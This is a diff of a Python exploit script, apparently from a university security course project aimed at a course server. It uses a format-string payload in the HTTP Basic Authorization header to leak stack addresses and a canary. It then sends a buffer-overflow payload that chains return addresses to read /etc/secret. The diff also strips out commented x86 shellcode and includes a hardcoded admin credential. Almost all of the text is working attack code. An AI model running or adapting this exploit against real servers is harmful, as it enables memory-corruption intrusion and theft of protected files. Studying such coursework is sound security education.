@@ -1,78 +1,109 @@
-# import requests
-# import base64
 
 
-url = "http://localhost:8000/"
+url = "http://project-2.csec.chatzi.org:8000"
+pas="admin:8c6e2f34df08e2f879e61eeb9e8ba96f8d9e96d8033870f80127567d270d7d96"
 
-# payl = "test" + ":" + "029794db6e76cb559613732d7c94b24b360bb6f05879bb99e7765518b55abc57"
-# headers = {"Authorization":"Basic " + base64.b64encode(payl.encode("utf-8")).decode("utf-8"),'Content-Length': '2'}
-# payload = {'test': 'value1', 'key2': 'value2'}
-
-
-
-# response = requests.post(url,headers = headers,data="h2")
-
-# print(response.status_code)
-# print(response.headers)
-# print(response.text)
 
 from requests import Request, Session
 import base64
 import time
+import requests
 
 
-pas="test:029794db6e76cb559613732d7c94b24b360bb6f05879bb99e7765518b55abc57"
+last = None		#teleutaio
+semi_last = None	#proteleutaio
+canery = None #4o apo to telos
+hellooo = None	#trito
+
 
 def transform_address(address):
 
 	mybytes= address.to_bytes(4, byteorder='little')
 	mystring = ""
 	for b in mybytes:
-		mystring += '%c' % int(b)
-	
+		if int(b) != 0:
+			mystring += '%c' % int(b)
+			print(int(b))
+		else:
+			mystring += '%c' % 0x26
+			print(0x26)
 	return mystring
 
-#b = b'15' "\x15"
+
+
+def set_variables():
+	global last
+	global semi_last
+	global canery
+	global hellooo
+
+	payl = "%p %d %p %p %p %p %s %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p:psswd"
+
+	headers = {"Authorization":"Basic " + base64.b64encode(payl.encode("utf-8")).decode("utf-8")}
+	response = requests.get(url,headers = headers)
+
+	print(response.status_code)
+	mystring = response.headers['WWW-Authenticate'][13:-1].split(' ')
 
 
 
-# guessed 0xffad4d20
-# 0xFFAD4D7C
+	last = int(mystring[-1],16)
+	semi_last = int(mystring[-2],16)
+	canery = int(mystring[-4],16)
+	hellooo = int(mystring[4],16)
 
-#9D19CA00
-
-
-guessed_address=0xffb5ece8 - 0xB8	#vale to teleutaio argument anti gia 0xffb5ece8
-send_file = 0xf39def00 - 0x4FA9 #vale to proteleutaio argument anti gia 0xf39def00
-var_c0_value = 0xf39def26		#vale to 4o apo to telos
+set_variables()
 
 
-shutdown = 0x5660988B			#vres dieuthinsi shutdown
+guessed_address=last - 0xB8	#vale to teleutaio argument 
+send_file = semi_last - 0x4f85 #vale to proteleutaio argument 
+var_c0_value = canery	#vale to 4o apo to telos
 
-#Isos na thelei na baleis kai ta arguments meta to teleutaio transform 
 
+
+old_ebp = last
+old_esi = 0xF7F31000 #####dn paizei kapoio rolo
+old_ebx = var_c0_value
+
+#FFCD7398  FFCD73C8
+#FFCD7394  F7FD9000
+#FFCD7390  565FDF00
+
+# ebp FFDB6398: FFDB63E8
+# esi FFDB63B4:	F7F31000
+# ebx FFDB63B0: 565A4F00
+
+
+shutdown = hellooo - 0x1C7	#vres original return address of post_param
+print("send_file difference with semi_last")
+print(hex(semi_last - send_file))
+
+
+#hmm 565A3AF8
 
 
 print(hex(guessed_address))
 
-#Original
-# shellcode="!!\xEB\x29\x5E\x31\xC0\x88\x46\x08\x88\x46\x11\x89\x76\x12\x89\xF2\x83\xC2\x09\x89\x56\x16\x89\x46\x1A\xB0\x0B\x89\xF3\x8D\x4E\x12\x31\xD2\xCD\x80\x31\xC0\x40\x31\xDB\xCD\x80\xE8\xD2\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x63\x61\x74\x58\x4D\x61\x6B\x65\x66\x69\x6C\x65\x01"
-# shellcode="\x31\xC0\xEB\x24\x5E\x31\xC0\x88\x46\x08\x88\x46\x11\x89\x76\x12\x89\xF2\x83\xC2\x09\x89\x56\x16\x89\x46\x1A\xB0\x0B\x89\xF3\x8D\x4E\x12\x31\xD2\xCD\x80\xEB\x05\xE8\xD7\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x63\x61\x74\x58\x4D\x61\x6B\x65\x66\x69\x6C\x65\x01"
 
 
+shellcode = "/etc/secret&" 
 
-shellcode = "Makefile&" 
+data = shellcode 
+data +=  80*"!" 
+data += transform_address(guessed_address + 140 + 4)
+data += 8*"!" + 4*"-" + 4*"-"+4*"!"
+data += transform_address(guessed_address + 8)
+data += 4*"-" 
+data +=  transform_address(var_c0_value)
+data += transform_address(old_ebx) 
+data += transform_address(old_esi) 
+data += transform_address(old_ebp) 
+data +=  transform_address(send_file) 
+data +=  transform_address(shutdown)
+data += transform_address(guessed_address)
+data += '\0'
 
-# shellcode=	"\xEB\x39\x5E\x31\xC0\x88\x46\x08\x88\x46\x11\x89\x76\x12\x89\xF2\x83\xC2\x09\x89\x56\x16\x89\x46\x1A\xB0\x0B\x89\xF3\x8D\x4E\x12\x31\xD2\xCD\x80\x31\xC0\x40\x50\x31\xC0\x31\xDB\xB0\x66\xB3\x0D\x89\xE1\xCD\x80\x31\xC0\x40\x31\xDB\xCD\x80\xE8\xC2\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x63\x61\x74\x58\x4D\x61\x6B\x65\x66\x69\x6C\x65\x01"
 
-# address_of_c = guessed_address + 132#size of final data
-# data = shellcode + 26*"!"+ transform_address(guessed_address+132+38) + 8*"!" +"\xFF\xFF\xFF\xFF"+ transform_address(address_of_c) + 5*transform_address(guessed_address)
-
-data = shellcode + 83*"!" +transform_address(guessed_address + 140 + 4) + 8*"!" + 4*"-" + 4*"-"+4*"!"+transform_address(guessed_address + 8) + 4*"-" + transform_address(var_c0_value)+12*"!" + transform_address(send_file) + transform_address(shutdown)+transform_address(guessed_address)+'\0'
-
-
-
-#66 + 38 + 4 + 4 + 5*4 = 132
 s = Session()
 
 req = Request('POST', url, data=data)
@@ -86,46 +117,4 @@ response = s.send(prepped)
 print(response.status_code)
 print(response.headers)
 print(response.content)
-
-
-
-
-
-# for i in range(20):
-# 	s = Session()
-# 	mystr = 42*"!"
-# 	address_of_c = 
-
-
-
-# 	# addr = "\x20\xce\x70\xff"
-# 	req = Request('POST', url, data="" + mystr +addr)
-
-# 	prepped = req.prepare()
-# 	prepped.headers['Content-Length'] = '66' 
-# 	prepped.headers['Authorization'] = "Basic " + base64.b64encode(pas.encode("utf-8")).decode("utf-8")
-# 	response = s.send(prepped)
-
-
-# 	print(response.status_code)
-# 	print(response.headers)
-# 	print(response.content)
-# 	time.sleep(1)
-
-
-
-	#FFC5B138
-
-
-	#TODO: overwrite char*c with an address containing '\0' so that the loop terminates immedately                   
-	# section .data
-    #	null_char db 0
-	# mov eax, null_char
-	# mov [c], eax
-
-	#	   overwrite char*name with FFFFFFF
-	# mov eax, 0xFFFFFFFF
-    # mov [name], eax
-	
-	#	   guess the buffer address
 
